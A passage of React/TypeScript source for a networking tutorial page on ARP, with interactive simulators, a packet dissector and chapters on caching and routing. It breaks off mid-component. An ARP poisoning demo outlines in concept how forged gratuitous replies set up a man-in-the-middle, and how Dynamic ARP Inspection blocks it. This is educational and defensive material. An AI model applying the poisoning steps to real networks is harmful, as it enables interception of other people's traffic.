'use client'

import { useState } from 'react'
import { LearnLayout } from '@/components/content/LearnLayout'
import { KeyTakeaways } from '@/components/content/KeyTakeaways'

// ─── Helper components ────────────────────────────────────────────────────────

const ACC = '#10b981'

function Chapter({ n, title }: { n: number; title: string }) {
  const num = String(n).padStart(2, '0')
  return (
    <div style={{ marginBottom: 32 }}>
      <p style={{ fontSize: 11, color: ACC, fontFamily: 'var(--font-mono)', fontWeight: 700, margin: '0 0 6px', letterSpacing: '.12em' }}>// CHAPTER {num}</p>
      <h2 style={{ fontFamily: 'var(--font-display)', fontSize: 'clamp(22px,3.5vw,34px)', fontWeight: 900, letterSpacing: '-1.5px', color: 'var(--text)', margin: 0 }}>{title}</h2>
    </div>
  )
}

function Divider() { return <div style={{ borderTop: '1px solid var(--border)', margin: '56px 0' }} /> }
function Para({ children }: { children: React.ReactNode }) { return <p style={{ fontSize: 15, color: 'var(--text)', lineHeight: 1.9, margin: '0 0 18px' }}>{children}</p> }
function H2({ children }: { children: React.ReactNode }) { return <h3 style={{ fontSize: 20, fontWeight: 800, color: 'var(--text)', margin: '36px 0 14px', letterSpacing: '-0.5px' }}>{children}</h3> }
function H3({ children }: { children: React.ReactNode }) { return <h4 style={{ fontSize: 16, fontWeight: 700, color: 'var(--text)', margin: '28px 0 10px' }}>{children}</h4> }
function Accent({ children }: { children: React.ReactNode }) { return <strong style={{ color: ACC, fontWeight: 700 }}>{children}</strong> }
function Code({ children }: { children: React.ReactNode }) { return <code style={{ fontFamily: 'var(--font-mono)', fontSize: 13, background: '#1e293b', color: '#e2e8f0', padding: '2px 7px', borderRadius: 5 }}>{children}</code> }
function CodeBlock({ children }: { children: React.ReactNode }) {
  return <pre style={{ fontFamily: 'var(--font-mono)', fontSize: 12.5, background: '#0d1525', border: '1px solid #1e293b', borderRadius: 10, padding: '18px 20px', overflowX: 'auto', lineHeight: 1.7, color: '#94a3b8', margin: '18px 0 24px' }}>{children}</pre>
}
function StoryBox({ children }: { children: React.ReactNode }) {
  return <div style={{ background: 'rgba(59,130,246,0.07)', border: '1px solid rgba(59,130,246,0.2)', borderLeft: '4px solid #3b82f6', borderRadius: 10, padding: '18px 22px', margin: '22px 0', fontSize: 14.5, color: 'var(--text)', lineHeight: 1.85 }}><span style={{ fontWeight: 700, color: '#3b82f6', fontSize: 11, fontFamily: 'var(--font-mono)', letterSpacing: '.1em', display: 'block', marginBottom: 8 }}>// REAL-WORLD SCENARIO</span>{children}</div>
}
function WowBox({ emoji, title, children }: { emoji: string; title: string; children: React.ReactNode }) {
  return <div style={{ background: `${ACC}0d`, border: `1px solid ${ACC}30`, borderRadius: 10, padding: '18px 22px', margin: '22px 0', fontSize: 14.5, color: 'var(--text)', lineHeight: 1.85 }}><div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 8 }}><span style={{ fontSize: 20 }}>{emoji}</span><span style={{ fontWeight: 800, color: ACC, fontSize: 13 }}>{title}</span></div>{children}</div>
}
function Warn({ title, children }: { title: string; children: React.ReactNode }) {
  return <div style={{ background: 'rgba(245,158,11,0.07)', border: '1px solid rgba(245,158,11,0.25)', borderLeft: '4px solid #f59e0b', borderRadius: 10, padding: '18px 22px', margin: '22px 0', fontSize: 14.5, color: 'var(--text)', lineHeight: 1.85 }}><span style={{ fontWeight: 700, color: '#f59e0b', fontSize: 12, fontFamily: 'var(--font-mono)', display: 'block', marginBottom: 8 }}>⚠ {title}</span>{children}</div>
}
function Err({ title, children }: { title: string; children: React.ReactNode }) {
  return <div style={{ background: 'rgba(239,68,68,0.07)', border: '1px solid rgba(239,68,68,0.25)', borderLeft: '4px solid #ef4444', borderRadius: 10, padding: '18px 22px', margin: '22px 0', fontSize: 14.5, color: 'var(--text)', lineHeight: 1.85 }}><span style={{ fontWeight: 700, color: '#ef4444', fontSize: 12, fontFamily: 'var(--font-mono)', display: 'block', marginBottom: 8 }}>✗ Common Mistake — {title}</span>{children}</div>
}

const LEVEL_COLORS: Record<string, string> = { Beginner: '#10b981', Intermediate: '#3b82f6', Senior: '#8b5cf6', PhD: '#f97316' }
function IQ({ q, level, children }: { q: string; level: 'Beginner' | 'Intermediate' | 'Senior' | 'PhD'; children: React.ReactNode }) {
  const c = LEVEL_COLORS[level]
  return (
    <div style={{ background: `${ACC}08`, border: `1px solid ${ACC}20`, borderRadius: 12, padding: '20px 24px', margin: '24px 0' }}>
      <span style={{ display: 'inline-block', fontSize: 11, fontWeight: 700, color: '#fff', background: c, borderRadius: 20, padding: '3px 12px', marginBottom: 10 }}>{level}</span>
      <div style={{ fontWeight: 700, color: 'var(--text)', marginBottom: 8, lineHeight: 1.5 }}>{q}</div>
      <div style={{ fontSize: 14.5, color: 'var(--muted)', lineHeight: 1.85 }}>{children}</div>
    </div>
  )
}

// ─── Interactive 1: ARP Exchange Simulator ────────────────────────────────────

interface ArpEntry { ip: string; mac: string; age: number; type: 'dynamic' | 'static' }

const HOSTS = [
  { name: 'Your PC', ip: '192.168.1.50', mac: 'AA:BB:CC:DD:EE:01', color: '#10b981' },
  { name: 'Gateway', ip: '192.168.1.1', mac: '11:22:33:44:55:66', color: '#3b82f6' },
  { name: 'Server', ip: '192.168.1.100', mac: 'FF:EE:DD:CC:BB:AA', color: '#8b5cf6' },
  { name: 'Printer', ip: '192.168.1.200', mac: 'AA:11:BB:22:CC:33', color: '#f97316' },
]

function ArpSimulator() {
  const [arpTable, setArpTable] = useState<ArpEntry[]>([])
  const [log, setLog] = useState<string[]>([])
  const [src, setSrc] = useState(0)
  const [targetIp, setTargetIp] = useState(HOSTS[1].ip)

  function sendArp() {
    const sender = HOSTS[src]
    const target = HOSTS.find(h => h.ip === targetIp)
    const newLog: string[] = []
    let newTable = [...arpTable]

    const cached = newTable.find(e => e.ip === targetIp)
    if (cached) {
      newLog.push(`✓ CACHE HIT: ${targetIp} → ${cached.mac} already in ARP table. No broadcast needed.`)
    } else {
      newLog.push(`📢 ARP REQUEST (broadcast): "Who has ${targetIp}? Tell ${sender.ip}" — sent to FF:FF:FF:FF:FF:FF, ALL devices on segment receive it.`)
      if (target) {
        newLog.push(`📨 ARP REPLY (unicast): ${target.name} (${target.ip}) replies "I have ${target.ip}, my MAC is ${target.mac}" — sent directly to ${sender.mac}.`)
        newTable.push({ ip: target.ip, mac: target.mac, age: 0, type: 'dynamic' })
        newLog.push(`📖 LEARNED: ${target.ip} → ${target.mac} added to ARP cache (TTL: 300s on Linux, 600s on Windows)`)
      } else {
        newLog.push(`✗ NO REPLY: No host with IP ${targetIp} on this subnet. ARP request times out. Connection fails at Layer 2.`)
      }
    }

    // Sender also adds itself if not present
    if (!newTable.find(e => e.ip === sender.ip)) {
      newTable.push({ ip: sender.ip, mac: sender.mac, age: 0, type: 'static' })
    }

    setArpTable(newTable)
    setLog(prev => [...newLog, ...prev].slice(0, 24))
  }

  function clearEntry(ip: string) {
    setArpTable(prev => prev.filter(e => e.ip !== ip))
    setLog(prev => [`🗑 FLUSHED: ${ip} removed from ARP cache`, ...prev].slice(0, 24))
  }

  return (
    <div style={{ margin: '28px 0', background: '#080d18', border: '1px solid #1e293b', borderRadius: 14, overflow: 'hidden' }}>
      <div style={{ padding: '16px 20px', borderBottom: '1px solid #1e293b', display: 'flex', flexWrap: 'wrap', gap: 12, alignItems: 'center' }}>
        <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
          <label style={{ fontSize: 11, color: '#475569', fontFamily: 'monospace' }}>Sender</label>
          <select value={src} onChange={e => setSrc(Number(e.target.value))} style={{ background: '#0d1525', border: '1px solid #1e293b', borderRadius: 6, color: '#e2e8f0', padding: '6px 10px', fontSize: 12, fontFamily: 'monospace' }}>
            {HOSTS.map((h, i) => <option key={h.ip} value={i}>{h.name} ({h.ip})</option>)}
          </select>
        </div>
        <div style={{ fontSize: 18, color: '#334155', marginTop: 18 }}>asks about</div>
        <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
          <label style={{ fontSize: 11, color: '#475569', fontFamily: 'monospace' }}>Target IP</label>
          <input value={targetIp} onChange={e => setTargetIp(e.target.value)} style={{ background: '#0d1525', border: '1px solid #1e293b', borderRadius: 6, color: '#e2e8f0', padding: '6px 10px', fontSize: 12, fontFamily: 'monospace', width: 140 }} placeholder="192.168.1.x" />
        </div>
        <button onClick={sendArp} style={{ padding: '8px 18px', borderRadius: 8, background: ACC, color: '#000', fontWeight: 800, fontSize: 13, border: 'none', cursor: 'pointer', marginTop: 18 }}>Send ARP</button>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 0 }}>
        {/* ARP cache */}
        <div style={{ padding: '16px 18px', borderRight: '1px solid #1e293b' }}>
          <div style={{ fontSize: 11, color: '#475569', fontFamily: 'monospace', marginBottom: 10, fontWeight: 700 }}>ARP CACHE</div>
          {arpTable.length === 0 && <div style={{ fontSize: 12, color: '#334155', fontFamily: 'monospace', textAlign: 'center', padding: '16px 0' }}>empty — send an ARP to populate</div>}
          {arpTable.map(entry => {
            const host = HOSTS.find(h => h.ip === entry.ip)
            return (
              <div key={entry.ip} style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 8, padding: '6px 10px', background: '#0d1525', borderRadius: 6 }}>
                <div style={{ width: 8, height: 8, borderRadius: '50%', background: host?.color ?? '#64748b', flexShrink: 0 }} />
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div style={{ fontSize: 11, fontFamily: 'monospace', color: '#94a3b8' }}>{entry.ip}</div>
                  <div style={{ fontSize: 10, fontFamily: 'monospace', color: '#64748b' }}>{entry.mac}</div>
                </div>
                <span style={{ fontSize: 9, color: entry.type === 'static' ? '#f97316' : '#10b981', fontFamily: 'monospace', background: entry.type === 'static' ? '#f9731618' : '#10b98118', borderRadius: 4, padding: '2px 6px' }}>{entry.type}</span>
                <button onClick={() => clearEntry(entry.ip)} style={{ fontSize: 10, color: '#ef4444', background: 'none', border: 'none', cursor: 'pointer', padding: '0 4px' }}>✕</button>
              </div>
            )
          })}
        </div>

        {/* Log */}
        <div style={{ padding: '16px 18px' }}>
          <div style={{ fontSize: 11, color: '#475569', fontFamily: 'monospace', marginBottom: 10, fontWeight: 700 }}>ARP EVENT LOG</div>
          {log.length === 0 && <div style={{ fontSize: 12, color: '#334155', fontFamily: 'monospace', textAlign: 'center', padding: '16px 0' }}>no events yet</div>}
          {log.slice(0, 10).map((entry, i) => (
            <div key={i} style={{ fontSize: 11, color: i < 3 ? '#cbd5e1' : '#475569', fontFamily: 'monospace', marginBottom: 6, lineHeight: 1.5 }}>{entry}</div>
          ))}
        </div>
      </div>
    </div>
  )
}

// ─── Interactive 2: ARP Packet Dissector ─────────────────────────────────────

function ArpPacketDissector() {
  const [isRequest, setIsRequest] = useState(true)
  const [senderIp, setSenderIp] = useState('192.168.1.50')
  const [senderMac, setSenderMac] = useState('AA:BB:CC:DD:EE:01')
  const [targetIp, setTargetIp] = useState('192.168.1.1')

  const opcode = isRequest ? '0x0001' : '0x0002'
  const targetMac = isRequest ? '00:00:00:00:00:00' : '11:22:33:44:55:66'
  const etherDst = isRequest ? 'FF:FF:FF:FF:FF:FF' : senderMac

  const fields = [
    { name: 'Hardware Type', bytes: 2, value: '0x0001', desc: 'Ethernet (1). Specifies the network link layer protocol. 1=Ethernet, 6=IEEE 802.11 (Wi-Fi).' },
    { name: 'Protocol Type', bytes: 2, value: '0x0800', desc: 'IPv4 (0x0800). The EtherType of the protocol being mapped to hardware addresses.' },
    { name: 'Hardware Addr Length', bytes: 1, value: '6', desc: '6 bytes = 48-bit MAC address length. This tells the parser how many bytes to read for each hardware address.' },
    { name: 'Protocol Addr Length', bytes: 1, value: '4', desc: '4 bytes = 32-bit IPv4 address length. For IPv6 NDP this would be 16.' },
    { name: 'Operation', bytes: 2, value: opcode, desc: `${isRequest ? 'Request (1): "Who has this IP?" broadcast' : 'Reply (2): "I have that IP, here is my MAC" unicast response'}` },
    { name: 'Sender MAC', bytes: 6, value: senderMac, desc: `Hardware address of the sender (${isRequest ? 'the host performing the ARP request' : 'the target host that is replying'}). Always the real MAC, never spoofed in legitimate ARP.` },
    { name: 'Sender IP', bytes: 4, value: senderIp, desc: `IP address of the sender. In a request: the IP requesting the information. The target adds this to its own ARP cache.` },
    { name: 'Target MAC', bytes: 6, value: targetMac, desc: `${isRequest ? '00:00:00:00:00:00 (unknown — this is what we are asking for)' : `${targetMac} (filled in by the replying host)`}` },
    { name: 'Target IP', bytes: 4, value: targetIp, desc: `IP address being queried. In a request: "Who has ${targetIp}?"` },
  ]

  const colors = ['#10b981', '#06b6d4', '#8b5cf6', '#f97316', '#3b82f6', '#ef4444', '#f59e0b', '#ec4899', '#94a3b8']
  const [hovered, setHovered] = useState<number | null>(null)

  return (
    <div style={{ margin: '28px 0', background: '#080d18', border: '1px solid #1e293b', borderRadius: 14, overflow: 'hidden' }}>
      <div style={{ padding: '14px 18px', borderBottom: '1px solid #1e293b', display: 'flex', flexWrap: 'wrap', gap: 10, alignItems: 'center' }}>
        <div style={{ display: 'flex', gap: 8 }}>
          {[true, false].map(req => (
            <button key={String(req)} onClick={() => setIsRequest(req)} style={{ padding: '6px 14px', borderRadius: 16, border: `1px solid ${isRequest === req ? ACC : '#1e293b'}`, background: isRequest === req ? `${ACC}18` : 'transparent', color: isRequest === req ? ACC : '#64748b', fontSize: 11, fontWeight: 700, cursor: 'pointer' }}>
              {req ? 'ARP Request' : 'ARP Reply'}
            </button>
          ))}
        </div>
        <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap' }}>
          {[
            { label: 'Sender IP', value: senderIp, set: setSenderIp },
            { label: 'Sender MAC', value: senderMac, set: setSenderMac },
            { label: 'Target IP', value: targetIp, set: setTargetIp },
          ].map(f => (
            <div key={f.label} style={{ display: 'flex', flexDirection: 'column', gap: 2 }}>
              <label style={{ fontSize: 10, color: '#475569', fontFamily: 'monospace' }}>{f.label}</label>
              <input value={f.value} onChange={e => f.set(e.target.value)} style={{ background: '#0d1525', border: '1px solid #1e293b', borderRadius: 6, color: '#e2e8f0', padding: '4px 8px', fontSize: 11, fontFamily: 'monospace', width: 130 }} />
            </div>
          ))}
        </div>
      </div>

      <div style={{ padding: '18px 20px' }}>
        {/* Ethernet envelope */}
        <div style={{ fontSize: 11, color: '#475569', fontFamily: 'monospace', marginBottom: 8 }}>
          Ethernet frame: Dst={etherDst} | Src={senderMac} | EtherType=0x0806 (ARP)
        </div>

        {/* ARP packet field visual */}
        <div style={{ display: 'flex', height: 34, borderRadius: 8, overflow: 'hidden', marginBottom: 8 }}>
          {fields.map((f, i) => (
            <div
              key={f.name}
              onMouseEnter={() => setHovered(i)}
              onMouseLeave={() => setHovered(null)}
              style={{
                flex: f.bytes, background: hovered === i ? `${colors[i]}40` : `${colors[i]}18`,
                borderRight: '1px solid #080d18', cursor: 'pointer', transition: 'background .15s',
                display: 'flex', alignItems: 'center', justifyContent: 'center', overflow: 'hidden',
              }}
            >
              {f.bytes > 2 && <span style={{ fontSize: 8, color: colors[i], fontFamily: 'monospace', fontWeight: 800, padding: '0 3px', textAlign: 'center' }}>{f.name.split(' ').slice(0, 2).join(' ')}</span>}
            </div>
          ))}
        </div>

        {/* Byte scale */}
        <div style={{ display: 'flex', marginBottom: 16 }}>
          {fields.map((f, i) => (
            <div key={f.name} style={{ flex: f.bytes, textAlign: 'center', fontSize: 9, color: '#334155', fontFamily: 'monospace' }}>{f.bytes}B</div>
          ))}
        </div>

        {/* Detail */}
        {hovered !== null && (
          <div style={{ background: '#0d1525', borderRadius: 10, padding: '14px 16px', borderLeft: `3px solid ${colors[hovered]}` }}>
            <div style={{ display: 'flex', gap: 12, alignItems: 'baseline', marginBottom: 8 }}>
              <span style={{ fontSize: 13, fontWeight: 800, color: colors[hovered], fontFamily: 'monospace' }}>{fields[hovered].name}</span>
              <span style={{ fontSize: 11, color: ACC, fontFamily: 'monospace', fontWeight: 700 }}>{fields[hovered].value}</span>
              <span style={{ fontSize: 10, color: '#475569', fontFamily: 'monospace' }}>{fields[hovered].bytes} bytes</span>
            </div>
            <div style={{ fontSize: 13, color: '#94a3b8', lineHeight: 1.75 }}>{fields[hovered].desc}</div>
          </div>
        )}
        {hovered === null && (
          <div style={{ textAlign: 'center', fontSize: 12, color: '#334155', fontFamily: 'monospace' }}>hover over a field to inspect it — total ARP payload: 28 bytes</div>
        )}
      </div>
    </div>
  )
}

// ─── Interactive 3: ARP Poisoning Attack Demo ────────────────────────────────

const ATTACK_STEPS = [
  {
    phase: 'Normal',
    color: '#10b981',
    title: 'Legitimate ARP Cache State',
    desc: 'All hosts have correct IP→MAC mappings in their ARP caches. PC sends traffic to Gateway via Gateway\'s real MAC. No interception occurs.',
    pcArp: { gateway: '11:22:33:44:55:66', server: 'FF:EE:DD:CC:BB:AA' },
    gatewayArp: { pc: 'AA:BB:CC:DD:EE:01', server: 'FF:EE:DD:CC:BB:AA' },
    flow: 'PC → Gateway (11:22:33...) → Internet',
    intercepted: false,
  },
  {
    phase: 'Attack begins',
    color: '#f97316',
    title: 'Attacker Sends Gratuitous ARPs',
    desc: 'Attacker sends unsolicited ARP replies to PC: "192.168.1.1 (Gateway) is at AA:AA:AA:AA:AA:AA (Attacker\'s MAC)." Also sends to Gateway: "192.168.1.50 (PC) is at AA:AA:AA:AA:AA:AA."',
    pcArp: { gateway: 'AA:AA:AA:AA:AA:AA', server: 'FF:EE:DD:CC:BB:AA' },
    gatewayArp: { pc: 'AA:AA:AA:AA:AA:AA', server: 'FF:EE:DD:CC:BB:AA' },
    flow: 'PC → Attacker (AA:AA:AA...) instead of Gateway',
    intercepted: true,
  },
  {
    phase: 'MITM active',
    color: '#ef4444',
    title: 'Man-in-the-Middle Established',
    desc: 'Attacker forwards traffic between PC and Gateway while reading all plaintext content. PC thinks it\'s talking to the Gateway. Gateway thinks it\'s talking to the PC. Attacker sees everything.',
    pcArp: { gateway: 'AA:AA:AA:AA:AA:AA', server: 'FF:EE:DD:CC:BB:AA' },
    gatewayArp: { pc: 'AA:AA:AA:AA:AA:AA', server: 'FF:EE:DD:CC:BB:AA' },
    flow: 'PC → Attacker → Gateway (traffic intercepted and forwarded)',
    intercepted: true,
  },
  {
    phase: 'Defense',
    color: '#3b82f6',
    title: 'Dynamic ARP Inspection Active',
    desc: 'Switch intercepts the fake ARP reply. It checks against DHCP snooping binding table: "192.168.1.1 should be MAC 11:22:33:44:55:66 — but this ARP claims 192.168.1.1 is at AA:AA:AA:AA:AA:AA. INVALID — DROPPED." Attack fails.',
    pcArp: { gateway: '11:22:33:44:55:66', server: 'FF:EE:DD:CC:BB:AA' },
    gatewayArp: { pc: 'AA:BB:CC:DD:EE:01', server: 'FF:EE:DD:CC:BB:AA' },
    flow: 'PC → Gateway (11:22:33...) → Internet (protected)',
    intercepted: false,
  },
]

function ArpPoisoningDemo() {
  const [step, setStep] = useState(0)
  const current = ATTACK_STEPS[step]

  return (
    <div style={{ margin: '28px 0', background: '#080d18', border: '1px solid #1e293b', borderRadius: 14, overflow: 'hidden' }}>
      {/* Phase tabs */}
      <div style={{ padding: '12px 18px', borderBottom: '1px solid #1e293b', display: 'flex', gap: 8, flexWrap: 'wrap' }}>
        {ATTACK_STEPS.map((s, i) => (
          <button key={s.phase} onClick={() => setStep(i)} style={{ padding: '5px 12px', borderRadius: 16, border: `1px solid ${i === step ? s.color : '#1e293b'}`, background: i === step ? `${s.color}18` : 'transparent', color: i === step ? s.color : '#64748b', fontSize: 11, fontWeight: 700, cursor: 'pointer', fontFamily: 'monospace' }}>{s.phase}</button>
        ))}
      </div>

      <div style={{ padding: '20px 22px' }}>
        <div style={{ fontSize: 15, fontWeight: 800, color: current.color, marginBottom: 10 }}>{current.title}</div>
        <p style={{ fontSize: 13.5, color: '#94a3b8', lineHeight: 1.8, marginBottom: 18 }}>{current.desc}</p>

        {/* ARP cache state */}
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12, marginBottom: 16 }}>
          {[
            { host: "PC's ARP Cache", entries: current.pcArp, color: '#10b981' },
            { host: "Gateway's ARP Cache", entries: current.gatewayArp, color: '#3b82f6' },
          ].map(cache => (
            <div key={cache.host} style={{ background: '#0d1525', borderRadius: 10, padding: '14px 16px' }}>
              <div style={{ fontSize: 11, color: cache.color, fontFamily: 'monospace', fontWeight: 800, marginBottom: 10 }}>{cache.host}</div>
              {Object.entries(cache.entries).map(([ip, mac]) => {
                const isPoison = mac.startsWith('AA:AA:AA')
                return (
                  <div key={ip} style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 6, padding: '4px 8px', background: isPoison ? '#1a0a0a' : '#0a0f1e', borderRadius: 6, border: `1px solid ${isPoison ? '#991b1b' : '#1e293b'}` }}>
                    <span style={{ fontSize: 11, color: '#64748b', fontFamily: 'monospace' }}>{ip === 'gateway' ? '192.168.1.1' : ip === 'server' ? '192.168.1.100' : '192.168.1.50'}</span>
                    <span style={{ fontSize: 11, color: isPoison ? '#ef4444' : '#10b981', fontFamily: 'monospace', fontWeight: isPoison ? 700 : 400 }}>{mac}{isPoison ? ' ← POISONED' : ''}</span>
                  </div>
                )
              })}
            </div>
          ))}
        </div>

        {/* Traffic flow */}
        <div style={{ padding: '12px 16px', background: current.intercepted ? '#1a0a0a' : '#0a1a12', border: `1px solid ${current.intercepted ? '#991b1b' : '#166534'}`, borderRadius: 8, fontSize: 13, color: current.intercepted ? '#fecaca' : '#bbf7d0', fontFamily: 'monospace' }}>
          <span style={{ fontWeight: 800, marginRight: 8 }}>{current.intercepted ? '⚠ INTERCEPTED:' : '✓ SECURE:'}</span>
          {current.flow}
        </div>
      </div>
    </div>
  )
}

// ─── Module ────────────────────────────────────────────────────────────────────

export default function ArpPage() {
  return (
    <LearnLayout
      title="ARP — Address Resolution Protocol"
      description="The glue between Layer 2 and Layer 3 — how every packet finds the MAC address it needs, and why this simple protocol is a persistent security vulnerability."
      section="Networking Fundamentals — Module 09"
      readTime="18–24 min"
      updatedAt="May 2026"
    >
      {/* ── Chapter 01 ── */}
      <Chapter n={1} title="The Missing Link Between IP and Ethernet" />

      <StoryBox>
        Your browser knows it wants to talk to 142.250.182.14 (Google). Your OS creates an IP packet
        with that destination. But to actually transmit this packet onto the Ethernet cable, it needs
        to put it inside an Ethernet frame — and an Ethernet frame needs a destination MAC address.
        IP routing told you the next hop is your gateway at 192.168.1.1. But what is your gateway&apos;s
        MAC address? You&apos;ve never configured it. Your OS has never been told it.
        This is ARP&apos;s entire job: find the MAC address for an IP address on your local network.
      </StoryBox>

      <Para>
        ARP (Address Resolution Protocol, RFC 826, 1982) solves a fundamental problem: IP addresses
        and MAC addresses exist in separate address spaces. The IP routing system determines where a
        packet needs to go next. ARP translates that IP address into the hardware address needed to
        actually deliver the packet on the local segment. Without ARP, IP over Ethernet wouldn&apos;t work.
      </Para>

      <Para>
        ARP is remarkably simple — only 28 bytes of payload, two message types (Request and Reply),
        and no authentication whatsoever. That simplicity is both its strength (lightweight, fast,
        universally compatible) and its primary weakness (trivially exploitable by anyone on the local network).
      </Para>

      <WowBox emoji="⚡" title="40 Years Unchanged">
        ARP was defined in RFC 826 by David Plummer in November 1982 — three pages of specification.
        It has remained essentially unchanged for 40 years. In those 40 years, it has been the target
        of more local network attacks than probably any other protocol. The successor for IPv6 is NDP
        (Neighbor Discovery Protocol), which uses ICMPv6 and adds cryptographic protection — lessons
        learned from 40 years of ARP attacks.
      </WowBox>

      <Divider />

      {/* ── Chapter 02 ── */}
      <Chapter n={2} title="The ARP Request/Reply Exchange" />

      <Para>
        ARP uses two message types: <Accent>ARP Request</Accent> (broadcast to everyone: "Who has this IP?")
        and <Accent>ARP Reply</Accent> (unicast back to the requester: "I do, and here is my MAC").
        The exchange takes one round-trip — one broadcast, one unicast response.
      </Para>

      <H2>Step by Step</H2>

      <CodeBlock>{`Scenario: PC (192.168.1.50) wants to ping Gateway (192.168.1.1)

STEP 1 — Check ARP cache:
  OS looks up 192.168.1.1 in its ARP table.
  Not found → must send an ARP Request.

STEP 2 — ARP Request (broadcast):
  Ethernet frame:
    Dst MAC: FF:FF:FF:FF:FF:FF (broadcast — all devices receive this)
    Src MAC: AA:BB:CC:DD:EE:01 (PC's MAC)
    EtherType: 0x0806 (ARP)
  ARP payload:
    Operation: 0x0001 (Request)
    Sender MAC: AA:BB:CC:DD:EE:01
    Sender IP: 192.168.1.50
    Target MAC: 00:00:00:00:00:00 (unknown — this is what we want)
    Target IP: 192.168.1.1

  Every device on the local segment receives this frame.
  Only the gateway (192.168.1.1) responds.

STEP 3 — ARP Reply (unicast):
  Ethernet frame:
    Dst MAC: AA:BB:CC:DD:EE:01 (back to the PC, unicast)
    Src MAC: 11:22:33:44:55:66 (Gateway's MAC)
    EtherType: 0x0806
  ARP payload:
    Operation: 0x0002 (Reply)
    Sender MAC: 11:22:33:44:55:66 (Gateway's actual MAC)
    Sender IP: 192.168.1.1
    Target MAC: AA:BB:CC:DD:EE:01
    Target IP: 192.168.1.50

STEP 4 — Cache update:
  PC adds: 192.168.1.1 → 11:22:33:44:55:66 to ARP cache.
  PC can now send the ICMP ping packet inside an Ethernet frame addressed to Gateway's MAC.
  ARP cache entry will expire after ~300s (Linux) or ~600s (Windows).`}</CodeBlock>

      <ArpSimulator />

      <Divider />

      {/* ── Chapter 03 ── */}
      <Chapter n={3} title="The ARP Packet Format" />

      <Para>
        ARP is one of the simplest protocols in the stack — just 28 bytes of payload (for IPv4/Ethernet).
        Understanding the exact format lets you read ARP in Wireshark captures and understand
        protocol subtleties like how ARP works over Wi-Fi vs Ethernet.
      </Para>

      <ArpPacketDissector />

      <H2>Gratuitous ARP</H2>

      <Para>
        A <Accent>gratuitous ARP</Accent> is an ARP Request or Reply where the sender IP and target IP
        are the same — the host is announcing its own IP-to-MAC mapping without being asked. Used for:
      </Para>

      <CodeBlock>{`1. IP conflict detection:
   Host sends Gratuitous ARP for its own IP before using it.
   If another host replies → IP conflict! (RFC 5227 / ARP probe/announcement)

2. Cluster failover:
   Active node fails → standby node takes over the virtual IP.
   Standby sends Gratuitous ARP: "VIP 10.0.0.50 is now at MAC AA:BB:CC:DD:EE:99"
   All hosts update their ARP cache → traffic flows to the new node immediately.

3. NIC/MAC change:
   Server NIC replaced → new MAC. Gratuitous ARP broadcasts new mapping.
   Without it: all other hosts cache the old MAC → traffic fails until ARP cache expires.

4. VM live migration:
   VM moves to new hypervisor. New hypervisor sends Gratuitous ARP for VM's IP.
   All switches learn new port association. All hosts update ARP cache.

$ arping -I eth0 -c 1 192.168.1.50   # Send Gratuitous ARP (Linux)
  (target IP = sender IP in the ARP payload)`}</CodeBlock>

      <Divider />

      {/* ── Chapter 04 ── */}
      <Chapter n={4} title="The ARP Cache: Storing What We Know" />

      <Para>
        The ARP cache (also called the ARP table or neighbor cache) stores recently resolved IP-to-MAC
        mappings. Without caching, every packet to every destination would require an ARP exchange —
        a broadcast before each and every frame. With caching, ARP is needed only when communicating
        with a new neighbor for the first time.
      </Para>

      <H2>Cache Lifetimes and Entry Types</H2>

      <CodeBlock>{`Linux ARP cache entries:
  REACHABLE: Confirmed working, ~30 seconds (gc_stale_time)
  STALE: Not confirmed recently but still usable; will refresh on next use
  DELAY: Stale, waiting for confirmation before use
  PROBE: Actively sending ARP requests to confirm reachability
  FAILED: ARP requests sent, no response received

$ ip neighbor show
192.168.1.1  dev eth0  lladdr 11:22:33:44:55:66  REACHABLE
192.168.1.50 dev eth0  lladdr aa:bb:cc:dd:ee:01  STALE

Windows ARP cache:
  Dynamic entries: expire after 2 minutes of no traffic (can be up to 10 min)
  Static entries: permanent until manually removed

$ arp -a                        # Windows/macOS: show ARP cache
$ ip neigh show                 # Linux: show neighbor cache (replaces arp -a)
$ ip neigh flush dev eth0       # Linux: flush all ARP entries on eth0
$ arp -d 192.168.1.1            # Delete specific ARP entry (macOS/Windows)`}</CodeBlock>

      <H3>What Happens When ARP Cache Is Empty</H3>

      <Para>
        When a host wants to send traffic to a local IP not in its ARP cache, it must send an ARP Request
        before the first packet can be delivered. This adds one round-trip latency (typically 1-5ms on
        a LAN) to the first packet. For applications that open many connections to different hosts, ARP
        resolution can be a meaningful overhead — especially in large data centers where any server may
        need to communicate with any other server.
      </Para>

      <Divider />

      {/* ── Chapter 05 ── */}
      <Chapter n={5} title="ARP in Action: Routing Decisions and ARP" />

      <Para>
        A subtle but critical point: ARP is only used for hosts on the <Accent>same local subnet</Accent>.
        When you send a packet to a host on a different subnet, you don&apos;t ARP for the destination IP —
        you ARP for the <Accent>gateway&apos;s IP</Accent>. The packet&apos;s IP header still contains the final
        destination, but the Ethernet frame is addressed to the gateway.
      </Para>

      <H2>ARP Decision Tree</H2>

      <CodeBlock>{`You want to send to 8.8.8.8 (Google DNS, not on your subnet):

  1. Is 8.8.8.8 in my subnet (192.168.1.0/24)?
     → No. 8.8.8.8 is not in range 192.168.1.1-192.168.1.254.
  2. Look up next hop in routing table:
     → Default route: 0.0.0.0/0 via 192.168.1.1 (gateway)
  3. Is 192.168.1.1 in ARP cache?
     → No → send ARP Request for 192.168.1.1
     → Yes → use cached MAC
  4. Build Ethernet frame:
     IP header: Dst = 8.8.8.8 (final destination)
     Ethernet: Dst MAC = 11:22:33:44:55:66 (gateway's MAC)
  5. Gateway receives frame, strips Ethernet header.
     Reads IP destination: 8.8.8.8 → routes to internet.

You want to send to 192.168.1.100 (same subnet):

  1. Is 192.168.1.100 in my subnet? → Yes.
  2. Is 192.168.1.100 in ARP cache?
     → No → ARP Request for 192.168.1.100 (broadcast on local segment)
  3. 192.168.1.100 replies with its MAC.
  4. Build Ethernet frame directly to 192.168.1.100's MAC.
  5. Packet delivered directly without going through gateway.`}</CodeBlock>

      <Warn title="Wrong default gateway looks like an ARP problem">
